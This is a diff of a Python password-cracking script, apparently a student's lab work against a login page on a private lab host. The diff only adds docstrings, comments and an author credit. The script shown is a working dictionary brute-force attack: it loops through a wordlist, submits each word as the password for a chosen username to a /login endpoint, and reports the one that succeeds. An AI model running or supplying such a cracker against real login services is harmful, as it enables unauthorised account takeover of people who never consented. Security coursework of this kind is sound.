@@ -1,12 +1,15 @@
-#!/usr/bin/env python3
-# crack_login.py
-# Usage: sudo python3 crack_login.py --host 192.168.60.2 --port 60 --user f006bsj \
-#          --dict english_words.txt --sleep 0.2
+"""
+@Author: Dickson Alexander and Jason Peng
+"""
 
 import argparse, requests, time, re, sys
 from requests.exceptions import RequestException
 
 def try_password(session, url, username, password, method="POST"):
+    """
+    Try to login with the given username and password using the specified method.
+    Returns the response object.
+    """
     if method.upper() == "POST":
         data = {"username": username, "password": password}
         r = session.post(url, data=data, timeout=2)
@@ -15,6 +18,9 @@ def try_password(session, url, username, password, method="POST"):
     return r
 
 def looks_like_success(resp):
+    """
+    Check if the login attempt was successful based on the response.  Returns True if successful, False otherwise.
+    """
     # If no response, treat as failure
     if resp is None:
         return False
@@ -37,11 +43,13 @@ def main():
     p.add_argument("--method", choices=["POST","GET"], default="POST", help="Try POST or GET fallback")
     args = p.parse_args()
 
+    # Setup the session based off the capture we saw on wireshark
     base = f"http://{args.host}:{args.port}"
     login_url = f"{base}/login"
     session = requests.Session()
     session.headers.update({"User-Agent":"crack-script/1.0"})
 
+    # Load the passwords from the dictionary file (in this case english_words.txt)
     try:
         with open(args.dict, "r", encoding="utf-8", errors="ignore") as fh:
             words = [w.strip() for w in fh if w.strip()]
@@ -49,6 +57,7 @@ def main():
         print("dictionary file not found")
         sys.exit(1)
 
+    # Loop through the passwords and try each one
     print(f"Trying {len(words)} passwords against {login_url} as {args.user}")
     for i, pw in enumerate(words, 1):
         try:
@@ -67,7 +76,7 @@ def main():
             return
         else:
             if i % 50 == 0:
-                print(f"[{i}/{len(words)}] still trying ... last tried: {pw}")
+                print(f"[{i}/{len(words)}] still trying ... last tried: {pw}") # progress update every 50 attempts
         time.sleep(args.sleep)
 
     print("exhausted dictionary without success")
